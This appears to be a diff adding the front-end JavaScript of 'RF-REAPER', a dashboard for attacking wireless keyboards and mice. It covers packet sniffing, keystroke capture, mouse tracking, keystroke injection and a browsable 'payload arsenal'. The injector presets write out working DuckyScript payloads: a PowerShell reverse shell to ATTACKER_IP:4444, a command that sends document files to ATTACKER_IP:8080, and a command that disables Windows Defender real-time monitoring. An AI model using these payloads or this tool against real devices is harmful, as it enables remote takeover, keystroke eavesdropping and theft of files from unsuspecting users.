+  uniqueAddresses.clear();
+  document.getElementById('sniff-total').textContent = '0';
+  document.getElementById('sniff-unique').textContent = '0';
+  document.getElementById('sniff-decoded').textContent = '0';
+}
+
+function addPacket(pkt) {
+  ppsCounter++;
+  packetTotal++;
+  if (pkt.address) uniqueAddresses.add(pkt.address);
+  if (pkt.decoded) packetDecoded++;
+
+  document.getElementById('sniff-total').textContent = formatNumber(packetTotal);
+  document.getElementById('sniff-unique').textContent = uniqueAddresses.size;
+  document.getElementById('sniff-decoded').textContent = formatNumber(packetDecoded);
+  document.getElementById('stat-packets').textContent = formatNumber(packetTotal);
+
+  // Filter check
+  const filter = document.getElementById('sniff-filter-type').value;
+  if (filter !== 'all' && pkt.type && pkt.type.toLowerCase() !== filter) return;
+
+  const log = document.getElementById('packet-log');
+  // Remove placeholder
+  if (packetTotal === 1 && log.querySelector('div[style]')) {
+    log.innerHTML = '';
+  }
+
+  const entry = document.createElement('div');
+  entry.className = 'packet-entry';
+  entry.onclick = () => decodePacket(pkt);
+  entry.innerHTML = `
+    <span class="packet-time">${pkt.timestamp || new Date().toLocaleTimeString('en-US', { hour12: false })}</span>
+    <span class="packet-chan">CH${pkt.channel ?? '?'}</span>
+    <span class="packet-addr">${pkt.address || '—'}</span>
+    <span class="packet-hex">${pkt.raw || '—'}</span>
+    ${pkt.decoded ? `<div class="packet-decoded">↳ ${escapeHtml(pkt.decoded)}</div>` : ''}
+  `;
+  log.insertBefore(entry, log.firstChild);
+
+  // Keep max 500 entries
+  while (log.children.length > 500) log.removeChild(log.lastChild);
+}
+
+function decodePacket(pkt) {
+  const panel = document.getElementById('packet-decode-panel');
+  panel.innerHTML = `
+    <div style="display:grid;grid-template-columns:100px 1fr;gap:4px 12px;font-size:0.7rem">
+      <span style="color:var(--text-dim)">Timestamp</span><span>${pkt.timestamp || '—'}</span>
+      <span style="color:var(--text-dim)">Channel</span><span style="color:var(--yellow)">${pkt.channel ?? '—'}</span>
+      <span style="color:var(--text-dim)">Address</span><span style="color:var(--cyan)">${pkt.address || '—'}</span>
+      <span style="color:var(--text-dim)">Type</span><span>${pkt.type || '—'}</span>
+      <span style="color:var(--text-dim)">Raw Hex</span><span style="word-break:break-all">${pkt.raw || '—'}</span>
+      <span style="color:var(--text-dim)">Decoded</span><span style="color:var(--green)">${pkt.decoded || 'No HID decode available'}</span>
+      <span style="color:var(--text-dim)">Length</span><span>${pkt.raw ? pkt.raw.replace(/\s/g, '').length / 2 + ' bytes' : '—'}</span>
+    </div>
+  `;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// INJECTOR
+// ═══════════════════════════════════════════════════════════════
+let payloadType = 'keyboard';
+
+function setPayloadType(type) {
+  payloadType = type;
+  document.querySelectorAll('.payload-type-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.payload-section').forEach(s => s.style.display = 'none');
+  event.target.classList.add('active');
+  document.getElementById('payload-' + type).style.display = '';
+}
+
+function loadPreset() {
+  const val = document.getElementById('inject-preset').value;
+  const presets = {
+    revshell: 'GUI r\nDELAY 300\nSTRING powershell -nop -w hidden -ep bypass -c "$c=New-Object Net.Sockets.TCPClient(\'ATTACKER_IP\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"\nENTER',
+    rickroll: 'GUI r\nDELAY 300\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER',
+    exfil: 'GUI r\nDELAY 300\nSTRING powershell -ep bypass -c "Get-ChildItem C:\\Users -Recurse -Include *.txt,*.doc,*.pdf | Select -First 10 | ForEach { Invoke-WebRequest -Uri http://ATTACKER_IP:8080/exfil -Method POST -InFile $_ }"\nENTER',
+    lock: 'GUI l',
+    notepad: 'GUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 500\nSTRING RF-REAPER was here! Your wireless keyboard is vulnerable.\nENTER',
+    disable_av: 'GUI r\nDELAY 300\nSTRING powershell -ep bypass Start-Process powershell -Verb runAs -ArgumentList \'-ep bypass -c Set-MpPreference -DisableRealtimeMonitoring $true\'\nENTER',
+  };
+  if (presets[val]) {
+    document.getElementById('inject-ducky').value = presets[val];
+    setPayloadType('ducky');
+    document.querySelectorAll('.payload-type-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.payload-type-tab')[1].classList.add('active');
+    document.querySelectorAll('.payload-section').forEach(s => s.style.display = 'none');
+    document.getElementById('payload-ducky').style.display = '';
+    logConsole(`Preset loaded: ${val}`, 'info');
+  }
+}
+
+async function sendInject() {
+  const addr = document.getElementById('inject-address').value.trim();
+  const ch = parseInt(document.getElementById('inject-channel').value) || 0;
+  if (!addr) { logConsole('ERROR: No target address specified!', 'err'); return; }
+
+  const btn = document.getElementById('btn-inject');
+  btn.classList.add('injecting');
+  setTimeout(() => btn.classList.remove('injecting'), 600);
+
+  let payload = {};
+  if (payloadType === 'keyboard') {
+    payload = { type: 'keyboard', text: document.getElementById('inject-text').value };
+  } else if (payloadType === 'ducky') {
+    payload = { type: 'ducky', script: document.getElementById('inject-ducky').value };
+  } else {
+    payload = {
+      type: 'mouse',
+      x: parseInt(document.getElementById('mouse-x').value),
+      y: parseInt(document.getElementById('mouse-y').value),
+      buttons: {
+        left: document.getElementById('mouse-btn-left').checked,
+        right: document.getElementById('mouse-btn-right').checked,
+        middle: document.getElementById('mouse-btn-middle').checked,
+      }
+    };
+  }
+
+  logConsole(`Injecting ${payloadType} payload to ${addr} on CH${ch}…`, 'info');
+  const result = await apiPost('/api/inject', { address: addr, channel: ch, payload });
+  if (result) {
+    addInjectResult({ success: result.success !== false, message: result.message || 'Injection sent', timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }) });
+  }
+}
+
+function addInjectResult(res) {
+  const log = document.getElementById('inject-log');
+  // Remove placeholder
+  if (log.querySelector('div[style]')) log.innerHTML = '';
+
+  const entry = document.createElement('div');
+  entry.className = 'inject-log-entry';
+  const cls = res.success ? 'success' : 'fail';
+  const icon = res.success ? '✓' : '✗';
+  entry.innerHTML = `<span class="ts" style="color:var(--text-dim)">[${res.timestamp || '—'}]</span> <span class="${cls}">${icon} ${escapeHtml(res.message || 'Unknown')}</span>`;
+  log.insertBefore(entry, log.firstChild);
+  logConsole(`Inject ${res.success ? 'SUCCESS' : 'FAILED'}: ${res.message || ''}`, res.success ? 'ok' : 'err');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// TRACKER
+// ═══════════════════════════════════════════════════════════════
+function startTrack() {
+  const addr = document.getElementById('track-address').value.trim();
+  if (!addr) { logConsole('ERROR: No target address for tracking!', 'err'); return; }
+  tracking = true;
+  trackerPoints = [];
+  trackerCenterX = 0; trackerCenterY = 0;
+  document.getElementById('btn-track-start').style.display = 'none';
+  document.getElementById('btn-track-stop').style.display = '';
+  apiPost('/api/track', { address: addr });
+  logConsole(`Tracking device: ${addr}`, 'ok');
+}
+function stopTrack() {
+  tracking = false;
+  document.getElementById('btn-track-start').style.display = '';
+  document.getElementById('btn-track-stop').style.display = 'none';
+  apiPost('/api/track', { address: null });
+  logConsole('Tracking stopped', 'warn');
+}
+
+function updateSignal(data) {
+  const pct = Math.min(100, Math.max(0, ((data.rssi + 100) / 60) * 100));
+  document.getElementById('signal-fill').style.width = pct + '%';
+  document.getElementById('signal-pct').textContent = Math.round(pct) + '%';
+  document.getElementById('rssi-value').textContent = (data.rssi || '—') + ' dBm';
+
+  if (data.channel !== undefined) {
+    const hopLog = document.getElementById('channel-hop-log');
+    const ts = new Date().toLocaleTimeString('en-US', { hour12: false, fractionalSecondDigits: 1 });
+    hopLog.innerHTML = `<span style="color:var(--yellow)">CH${data.channel}</span> <span style="color:var(--text-dim)">@ ${ts}</span><br>` + hopLog.innerHTML;
+    // Trim
+    if (hopLog.children.length > 60) {
+      while (hopLog.children.length > 50) hopLog.removeChild(hopLog.lastChild);
+    }
+  }
+}
+
+function addKeystroke(data) {
+  const log = document.getElementById('keystroke-log');
+  if (log.textContent.startsWith('Waiting')) log.innerHTML = '';
+  if (data.special) {
+    log.innerHTML += `<span class="special-key">${escapeHtml(data.key)}</span>`;
+  } else {
+    log.innerHTML += escapeHtml(data.key);
+  }
+  log.scrollTop = log.scrollHeight;
+}
+
+function addMovement(data) {
+  trackerCenterX += data.dx || 0;
+  trackerCenterY += data.dy || 0;
+  trackerPoints.push({ x: trackerCenterX, y: trackerCenterY, t: Date.now() });
+  if (trackerPoints.length > 300) trackerPoints.shift();
+  drawTrackerGraph();
+}
+
+function drawTrackerGraph() {
+  const canvas = document.getElementById('tracker-canvas');
+  const container = document.getElementById('tracker-graph-container');
+  const ctx = canvas.getContext('2d');
+  const dpr = window.devicePixelRatio || 1;
+  const rect = container.getBoundingClientRect();
+  canvas.width = rect.width * dpr;
+  canvas.height = rect.height * dpr;
+  ctx.scale(dpr, dpr);
+  const W = rect.width;
+  const H = rect.height;
+
+  ctx.clearRect(0, 0, W, H);
+
+  // Grid
+  ctx.strokeStyle = 'rgba(0, 255, 242, 0.05)';
+  ctx.lineWidth = 0.5;
+  for (let x = 0; x < W; x += 30) { ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, H); ctx.stroke(); }
+  for (let y = 0; y < H; y += 30) { ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(W, y); ctx.stroke(); }
+
+  // Crosshair
+  ctx.strokeStyle = 'rgba(0, 255, 242, 0.12)';
+  ctx.beginPath(); ctx.moveTo(W / 2, 0); ctx.lineTo(W / 2, H); ctx.stroke();
+  ctx.beginPath(); ctx.moveTo(0, H / 2); ctx.lineTo(W, H / 2); ctx.stroke();
+
+  if (trackerPoints.length < 2) {
+    ctx.fillStyle = 'rgba(0, 255, 242, 0.15)';
+    ctx.font = '11px JetBrains Mono';
+    ctx.textAlign = 'center';
+    ctx.fillText('Waiting for mouse movement data…', W / 2, H / 2);
+    return;
+  }
+
+  // Auto-scale
+  let minX = Infinity, maxX = -Infinity, minY = Infinity, maxY = -Infinity;
+  for (const p of trackerPoints) {
+    minX = Math.min(minX, p.x); maxX = Math.max(maxX, p.x);
+    minY = Math.min(minY, p.y); maxY = Math.max(maxY, p.y);
+  }
+  const rangeX = Math.max(50, maxX - minX);
+  const rangeY = Math.max(50, maxY - minY);
+  const scale = Math.min((W - 40) / rangeX, (H - 40) / rangeY);
+  const offsetX = W / 2 - ((minX + maxX) / 2) * scale;
+  const offsetY = H / 2 - ((minY + maxY) / 2) * scale;
+
+  // Trail
+  ctx.beginPath();
+  for (let i = 0; i < trackerPoints.length; i++) {
+    const p = trackerPoints[i];
+    const sx = p.x * scale + offsetX;
+    const sy = p.y * scale + offsetY;
+    if (i === 0) ctx.moveTo(sx, sy);
+    else ctx.lineTo(sx, sy);
+  }
+  ctx.strokeStyle = 'rgba(0, 255, 242, 0.5)';
+  ctx.lineWidth = 1.5;
+  ctx.stroke();
+
+  // Current position
+  const last = trackerPoints[trackerPoints.length - 1];
+  const lx = last.x * scale + offsetX;
+  const ly = last.y * scale + offsetY;
+  ctx.beginPath();
+  ctx.arc(lx, ly, 5, 0, Math.PI * 2);
+  ctx.fillStyle = 'var(--cyan)';
+  ctx.fill();
+  ctx.beginPath();
+  ctx.arc(lx, ly, 10, 0, Math.PI * 2);
+  ctx.strokeStyle = 'rgba(0, 255, 242, 0.3)';
+  ctx.lineWidth = 1;
+  ctx.stroke();
+}
+
+// ═══════════════════════════════════════════════════════════════
+// YICHIP
+// ═══════════════════════════════════════════════════════════════
+async function refreshYichip() {
+  logConsole('Fetching YICHIP dongle info…', 'info');
+  const data = await apiGet('/api/yichip/info');
+  if (data) updateYichipInfo(data);
+}
+
+function updateYichipInfo(data) {
+  document.getElementById('yc-status').textContent = data.status || 'Unknown';
+  document.getElementById('yc-vid').textContent = data.vid || '—';
+  document.getElementById('yc-pid').textContent = data.pid || '—';
+  document.getElementById('yc-serial').textContent = data.serial || '—';
+  document.getElementById('yc-chip').textContent = data.chip || '—';
+  document.getElementById('yc-firmware').textContent = data.firmware || '—';
+  document.getElementById('yc-protocol').textContent = data.protocol || '—';
+  document.getElementById('yc-pairing').textContent = data.pairing || '—';
+
+  if (data.hid_descriptor) {
+    document.getElementById('hid-descriptor').textContent = data.hid_descriptor;
+  }
+  if (data.findings && Array.isArray(data.findings)) {
+    const list = document.getElementById('yc-findings');
+    list.innerHTML = data.findings.map(f => {
+      const cls = f.severity === 'critical' ? 'finding-critical'
+        : f.severity === 'warning' ? 'finding-warning'
+        : 'finding-info';
+      const icon = f.severity === 'critical' ? '🔴'
+        : f.severity === 'warning' ? '🟡'
+        : 'ℹ️';
+      return `<li><span class="finding-icon ${cls}">${icon}</span> ${escapeHtml(f.text)}</li>`;
+    }).join('');
+  }
+  logConsole('YICHIP info updated', 'ok');
+}
+
+async function probeChannels() {
+  const start = parseInt(document.getElementById('yc-probe-start').value) || 0;
+  const end = parseInt(document.getElementById('yc-probe-end').value) || 80;
+  logConsole(`Probing vendor channels ${start}–${end}…`, 'info');
+  document.getElementById('yc-probe-results').innerHTML = '<span class="skeleton" style="display:inline-block;width:200px;height:14px"></span>';
+  const data = await apiPost('/api/yichip/probe', { start, end });
+  if (data && data.active_channels) {
+    document.getElementById('yc-probe-results').innerHTML = `
+      <div style="margin-bottom:6px;color:var(--green)">Found ${data.active_channels.length} active channel(s):</div>
+      <div style="display:flex;flex-wrap:wrap;gap:4px">
+        ${data.active_channels.map(ch => `<span style="background:rgba(0,255,136,0.12);border:1px solid rgba(0,255,136,0.25);border-radius:4px;padding:2px 8px;font-size:0.65rem;color:var(--green)">CH${ch}</span>`).join('')}
+      </div>
+    `;
+    logConsole(`Probe complete: ${data.active_channels.length} active channels found`, 'ok');
+  } else {
+    document.getElementById('yc-probe-results').innerHTML = '<span style="color:var(--text-dim)">No active channels found or probe failed.</span>';
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// DEMO MODE — Generate fake data when backend is unavailable
+// ═══════════════════════════════════════════════════════════════
+let demoMode = false;
+let demoInterval = null;
+
+function startDemoMode() {
+  demoMode = true;
+  logConsole('Backend unreachable — entering DEMO mode with simulated data', 'warn');
+
+  // Simulate status
+  updateStatus({ arduino: true, yichip: true, devices: 0, packets: 0 });
+
+  // Simulate spectrum
+  demoInterval = setInterval(() => {
+    for (let i = 0; i < 126; i++) {
+      spectrumData[i] = spectrumData[i] * 0.85 + (Math.random() * 0.15);
+      // Add some hotspots
+      if (i === 24 || i === 52 || i === 78) {
+        spectrumData[i] = Math.min(1, spectrumData[i] + Math.random() * 0.6);
+      }
+    }
+    drawSpectrum();
+  }, 200);
+
+  // Simulate devices
+  const demoDevices = [
+    { address: 'AA:BB:CC:DD:01', channel: 24, type: 'Keyboard', rssi: -45, vendor: 'Logitech' },
+    { address: 'AA:BB:CC:DD:02', channel: 52, type: 'Mouse', rssi: -62, vendor: 'Microsoft' },
+    { address: 'AA:BB:CC:DD:03', channel: 78, type: 'Unknown', rssi: -71, vendor: 'Unknown' },
+  ];
+  demoDevices.forEach((d, i) => setTimeout(() => addOrUpdateDevice(d), 1000 + i * 800));
+}
+
+// ═══════════════════════════════════════════════════════════════
+// INITIALIZATION
+// ═══════════════════════════════════════════════════════════════
+window.addEventListener('load', async () => {
+  logConsole('RF-REAPER v1.0 initializing…', 'info');
+  logConsole('Dashboard loaded. Connecting to backend…', 'info');
+
+  drawSpectrum();
+  drawTrackerGraph();
+
+  // Try connecting to backend
+  try {
+    const status = await apiGet('/api/status');
+    if (status) {
+      updateStatus(status);
+      logConsole('Backend connected successfully ✓', 'ok');
+      connectSSE();
+    } else {
+      startDemoMode();
+    }
+  } catch (e) {
+    startDemoMode();
+  }
+});
+
+// Resize handler
+window.addEventListener('resize', () => {
+  drawSpectrum();
+  drawTrackerGraph();
+});
+
+// Open console by default
+document.getElementById('console-body').classList.add('open');
+document.getElementById('console-arrow').textContent = '▼';
+
+// ═══════════════════════════════════════════════════════════════
+// PAYLOAD ARSENAL ENGINE
+// ═══════════════════════════════════════════════════════════════
+let payloadsLoaded = false;
+let allPayloads = [];
+let payloadCategories = [];
+let currentCategory = 'all';
+let currentOs = 'all';
+let selectedPayload = null;
+
+const catIcons = {
+  'recon':'🔍','exfiltration':'📤','credentials':'🔑','persistence':'🔄',
+  'reverse_shells':'🐚','pranks':'🎭','defense_evasion':'🛡️','lockout':'🔒',
+  'forensics':'🔬','wireshark':'🦈','rapid':'⚡','digispark':'🔌',
+  'wifi':'📶','camera':'📷','automation':'🤖','phishing':'🎣',
+  'download_exec':'💾','screen_capture':'🖥️','anti_afk':'☕'
+};
+
+async function loadPayloads() {
+  try {
+    const [pRes, cRes] = await Promise.all([
+      fetch(API_BASE + '/api/payloads'),
+      fetch(API_BASE + '/api/payloads/categories')
+    ]);
+    allPayloads = await pRes.json();
+    payloadCategories = await cRes.json();
+    payloadsLoaded = true;
+    document.getElementById('payload-total').textContent = allPayloads.length;
+    renderCategories();
+    renderPayloads(allPayloads);
+    logConsole(`Payload Arsenal loaded: ${allPayloads.length} payloads in ${payloadCategories.length} categories`, 'ok');
+  } catch (e) {
+    logConsole('Failed to load payloads: ' + e.message, 'error');
+  }
+}
+
+function renderCategories() {
+  const el = document.getElementById('payload-categories');
+  let html = `<div class="category-item ${currentCategory==='all'?'active':''}" onclick="setCategory('all')">
+    <span>All Payloads</span><span class="cat-count">${allPayloads.length}</span></div>`;
+  for (const cat of payloadCategories) {
+    const icon = catIcons[cat.id] || '📁';
+    html += `<div class="category-item ${currentCategory===cat.id?'active':''}" onclick="setCategory('${cat.id}')">
+      <span>${icon} ${cat.name.replace(/^[^\s]+ /,'')}</span><span class="cat-count">${cat.count}</span></div>`;
+  }
+  el.innerHTML = html;
+}
+
+function setCategory(catId) {
+  currentCategory = catId;
+  renderCategories();
+  filterPayloads();
+}
+
+function setOsFilter(os) {
+  currentOs = os;
+  document.querySelectorAll('.btn-os').forEach(b => {
+    b.classList.toggle('active', b.dataset.os === os);
+  });
+  filterPayloads();
+}
+
+function filterPayloads() {
+  const query = (document.getElementById('payload-search').value || '').toLowerCase();
+  let filtered = allPayloads;
+  if (currentCategory !== 'all') {
+    filtered = filtered.filter(p => p.category_id === currentCategory);
+  }
+  if (currentOs !== 'all') {
+    filtered = filtered.filter(p => p.os === currentOs);
+  }
+  if (query) {
+    filtered = filtered.filter(p =>
+      (p.name || '').toLowerCase().includes(query) ||
+      (p.description || '').toLowerCase().includes(query) ||
+      (p.script || '').toLowerCase().includes(query)
+    );
+  }
+  renderPayloads(filtered);
+  const info = [];
+  if (currentCategory !== 'all') info.push(currentCategory);
+  if (currentOs !== 'all') info.push(currentOs);
+  if (query) info.push(`"${query}"`);
+  document.getElementById('payload-filter-info').textContent = info.length ? `(${info.join(' + ')})` : '';
+}
+
+function renderPayloads(payloads) {
+  const el = document.getElementById('payload-list');
+  document.getElementById('payload-showing').textContent = payloads.length;
+  if (!payloads.length) {
+    el.innerHTML = '<div style="text-align:center;padding:24px;color:var(--text-dim);font-size:0.7rem">No payloads match your filters</div>';
+    return;
+  }
+  const osIcon = {windows:'🪟',macos:'🍎',linux:'🐧'};
+  const osClass = {windows:'pi-os-windows',macos:'pi-os-macos',linux:'pi-os-linux'};
+  el.innerHTML = payloads.map((p, i) => `
+    <div class="payload-item ${selectedPayload && selectedPayload.id===p.id ? 'active':''}"
+         onclick="selectPayload(${i})" data-idx="${i}">
+      <span class="pi-icon">${catIcons[p.category_id] || '📁'}</span>
+      <div class="pi-info">
+        <div class="pi-name">${escapeHtml(p.name)}</div>
+        <div class="pi-desc">${escapeHtml(p.description || '')}</div>
+      </div>
+      <span class="pi-os ${osClass[p.os] || ''}">${osIcon[p.os] || '🌐'} ${p.os || '?'}</span>
+    </div>`).join('');
+  // Store reference for selectPayload
+  el._payloads = payloads;
+}
+
+function selectPayload(idx) {
+  const el = document.getElementById('payload-list');
+  const payloads = el._payloads || allPayloads;
+  const p = payloads[idx];
+  if (!p) return;
+  selectedPayload = p;
+
+  // Highlight
+  el.querySelectorAll('.payload-item').forEach((item, i) => {
+    item.classList.toggle('active', i === idx);
+  });
+
+  // Show preview
+  const card = document.getElementById('payload-preview-card');
+  card.style.display = 'block';
+  document.getElementById('preview-name').textContent = p.name;
+  document.getElementById('preview-desc').textContent = p.description || '';
+
+  const osColors = {windows:'#4da6ff',macos:'#ccc',linux:'#ffaa44'};
+  const osEl = document.getElementById('preview-os');
+  osEl.textContent = (p.os || 'unknown').toUpperCase();
+  osEl.style.background = `rgba(0,255,242,0.1)`;
+  osEl.style.color = osColors[p.os] || 'var(--cyan)';
+
+  document.getElementById('preview-source').textContent = `Source: ${p.source || 'Community'}`;
+
+  // Syntax highlight-ish the DuckyScript
+  const script = (p.script || '').trim();
+  const highlighted = script.split('\n').map(line => {
+    const trimmed = line.trim();
+    if (trimmed.startsWith('REM')) return `<span style="color:#666">${escapeHtml(line)}</span>`;
+    if (trimmed.startsWith('STRING') || trimmed.startsWith('STRINGLN')) return `<span style="color:var(--green)">${escapeHtml(line)}</span>`;
+    if (trimmed.startsWith('DELAY')) return `<span style="color:var(--yellow)">${escapeHtml(line)}</span>`;
+    if (trimmed.startsWith('GUI') || trimmed.startsWith('WINDOWS') || trimmed.startsWith('COMMAND')) return `<span style="color:var(--magenta)">${escapeHtml(line)}</span>`;
+    if (trimmed.startsWith('CTRL') || trimmed.startsWith('ALT') || trimmed.startsWith('SHIFT')) return `<span style="color:var(--orange)">${escapeHtml(line)}</span>`;
+    if (trimmed.startsWith('ENTER')) return `<span style="color:var(--cyan)">${escapeHtml(line)}</span>`;
+    if (trimmed.startsWith('ID ')) return `<span style="color:var(--red)">${escapeHtml(line)}</span>`;
+    return escapeHtml(line);
+  }).join('\n');
+  document.getElementById('preview-script').innerHTML = highlighted;
+
+  // Scroll preview into view
+  card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+}
+
+function copyPayloadScript() {
+  if (!selectedPayload) return;
+  navigator.clipboard.writeText(selectedPayload.script.trim()).then(() => {
+    logConsole(`Copied "${selectedPayload.name}" to clipboard`, 'ok');
+  }).catch(() => {
+    // Fallback
+    const ta = document.createElement('textarea');
+    ta.value = selectedPayload.script.trim();
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    logConsole(`Copied "${selectedPayload.name}" to clipboard`, 'ok');
+  });
+}
+
+function loadToInjector() {
+  if (!selectedPayload) return;
+  // Switch to injector tab
+  document.querySelectorAll('.mode-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.mode-panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('tab-injector').classList.add('active');
+  document.getElementById('panel-injector').classList.add('active');
+
+  // Load script into ducky editor
+  const duckyArea = document.getElementById('ducky-script');
+  if (duckyArea) {
+    duckyArea.value = selectedPayload.script.trim();
+    logConsole(`Loaded "${selectedPayload.name}" into DuckyScript editor`, 'ok');
+  }
+}
+</script>
+</body>
+</html>
